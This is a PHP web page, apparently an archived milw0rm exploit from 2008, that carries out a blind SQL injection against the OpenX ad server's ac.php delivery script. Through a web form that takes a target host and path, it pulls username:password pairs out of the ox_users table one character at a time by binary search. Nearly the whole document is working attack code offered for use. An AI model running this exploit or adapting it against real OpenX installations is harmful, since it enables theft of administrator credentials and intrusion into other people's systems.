<html>
<head><title>OpenX Remote Blind SQL Injection Exploit By d00m3r4ng</title></head>
<body><center>
<?php
//discovered by d00m3r4ng
//exploit coded by d00m3r4ng
//contact: d00m3r4ng[at]gmail.com
set_time_limit(0);
function sockr($j, $exp, $asc){
extract ($_POST);
global $l;
if($socket = @fsockopen($host, 80,$e,$r,5)){
$inj="www/delivery/ac.php?bannerid=-1%20or%20ascii(substring((select%20$result%20from%20$table%20limit%20$l,1),$j,1))$exp"."$asc";
$req="GET /$path/$inj HTTP/1.1 \r\nHost: $host\r\nConnection: Close\r\n\r\n";
fwrite($socket, $req);
while (!feof($socket)) $res.=fgets($socket,512);
fclose($socket);}
if(strstr($res,"http://")) return true; else return false; }
function getLength(){
$i=1;
while(sockr($i,">",0)) $i++;
return $i;
}
function getValue($length){
for ($a=1;$a<$length;$a++){
$bl=45; $bh=123;
while(!sockr($a,"=",$b=intval(($bl+$bh)/2)))
if (sockr($a,">",$b)) $bl=$b;
else $bh=$b;
$v.=chr($b);}
return $v; }
$host="127.0.0.1";
$result="concat(username,0x3A,password)";
$table="ox_users";
if(isset($_POST['host'])){
extract($_POST);
$l=0;
while(sockr(1,">",0)) $l++;
$f=$l;
for ($l=0;$l<$f;$l++) 
if ($length=getLength())  echo "VALUE: ".getValue($length)."<br>"; }
?>
<b>OpenX Remote Blind SQL Injection Exploit By d00m3r4ng<br>
Vuln discovered and Exploit coded by d00m3r4ng<br>Contact: d00m3r4ng[at]gmail.com</b>
<br><br>
<form method="post">
Host: <input type="text" name="host" value="<?php echo $host ?>" size="70"><br>
OpenX Path: /<input type="text" name="path" size="100" value="<?php echo $path ?>"><br>
SELECT  <input type="text" name="result" size="50" value="<?php echo $result ?>">  FROM  <input type="text" name="table" value="<?php echo $table ?>"><br>
<input type="submit" value="Inject">
</form></center></body></html>

# milw0rm.com [2008-10-02]
